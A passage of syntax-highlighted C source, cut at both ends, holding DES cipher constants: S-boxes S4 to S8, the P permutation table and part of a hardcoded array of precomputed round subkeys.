</span><span style="color:#75715e"></span>	<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">8</span>,
	<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">14</span>,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">1</span>,
	<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">7</span>,
	 <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">12</span>,
	<span style="color:#75715e">//S4
</span><span style="color:#75715e"></span>	 <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">15</span>,
	<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">9</span>,
	<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">4</span>,
	 <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">14</span>,
	<span style="color:#75715e">//S5
</span><span style="color:#75715e"></span>	 <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">9</span>,
	<span style="color:#ae81ff">14</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">6</span>,
	 <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">14</span>,
	<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">3</span>,
	<span style="color:#75715e">//S6
</span><span style="color:#75715e"></span>	<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">11</span>,
	<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">8</span>,
	 <span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">14</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">6</span>,
   	 <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">13</span>,
	<span style="color:#75715e">//S7
</span><span style="color:#75715e"></span>	 <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">14</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">1</span>,
	<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">6</span>,
	 <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">14</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">2</span>,
	 <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">12</span>,
	<span style="color:#75715e">//S8
</span><span style="color:#75715e"></span>	<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">7</span>,
	 <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">2</span>,
	 <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">8</span>,
	 <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">11</span>
};

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> P_Table[<span style="color:#ae81ff">32</span>]<span style="color:#f92672">=</span>{
	<span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">20</span>,<span style="color:#ae81ff">21</span>,<span style="color:#ae81ff">29</span>,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">28</span>,<span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">23</span>,<span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">18</span>,<span style="color:#ae81ff">31</span>,<span style="color:#ae81ff">10</span>,
	 <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">24</span>,<span style="color:#ae81ff">14</span>,<span style="color:#ae81ff">32</span>,<span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">19</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">22</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">25</span>
};

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> SubKey[<span style="color:#ae81ff">16</span>][<span style="color:#ae81ff">48</span>]<span style="color:#f92672">=</span>{
	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,
	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,
	
	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>,
	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,
	
	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,
	
	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>,
	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
	
	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>,
	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>,
	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>,
	
	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>,
	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>,
	
	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,
	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>,
	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>,
	
	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>,
	<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>,
	<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>,
	
